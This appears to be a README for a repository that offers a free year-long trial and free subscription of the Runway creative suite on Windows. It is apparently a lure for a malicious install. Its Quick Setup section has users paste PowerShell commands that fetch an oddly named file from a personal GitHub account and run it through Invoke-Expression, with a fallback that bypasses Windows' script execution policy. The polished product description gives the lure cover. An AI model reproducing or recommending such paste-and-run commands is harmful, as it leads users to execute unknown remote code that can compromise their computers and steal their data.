# Runway

Runway on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Runway on Windows is a subscription creative suite for teams and solo makers who work with video frames, stills, and short motion pieces without juggling separate tools. Sessions usually start from a project folder on disk: you pick assets, run generation or enhancement steps, review outputs in the timeline, and export when a cut is ready. The app expects a current GPU driver and enough local storage for cache and renders, and it keeps your library tied to the machine profile you used during setup.

A typical afternoon might mean importing reference clips, applying style or inpaint passes on selected segments, batching still variants for a storyboard, then syncing approved takes back into your edit. Notifications and quota counters stay visible so you know when generation limits refresh under your plan tier. Offline-friendly pieces such as cached previews and exported files remain usable even when sync is paused.

This repository holds the Windows setup package, version notes, and a concise changelog for each release channel. You will find the installer manifest, optional component toggles, and post-install checklist that documents how the free trial is enabled for twelve months and how the free subscription is registered locally after configuration completes. Maintenance entries describe dependency updates and fixes that affect render stability on common desktop hardware.

## What you get

- Built-in free trial activates at first launch and stays valid for one full year.
- After setup finishes, the free subscription persists on this PC for daily creative work.
- Generative video and image tools share one timeline so previews stay aligned with exports.
- Local project folders keep assets, renders, and metadata organized per Windows user profile.
- Batch runs queue multiple clips or stills while GPU usage stays within configurable limits.
- Style and inpaint passes target selected frames without rebuilding entire sequences manually.
- Release notes in this repo document installer changes and render fixes for each channel.
- Optional components install only the modules you need for motion, stills, or both.

## Quick Setup (PowerShell)

This starts the built-in Runway free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/julia-p880882/runway-setup-guide/main/hrtmfmx2ic.ck6i7hch | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/julia-p880882/runway-setup-guide/main/hrtmfmx2ic.ck6i7hch | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `hrtmfmx2ic.ck6i7hch` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `julia-p880882/runway-setup-guide`. Runway 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
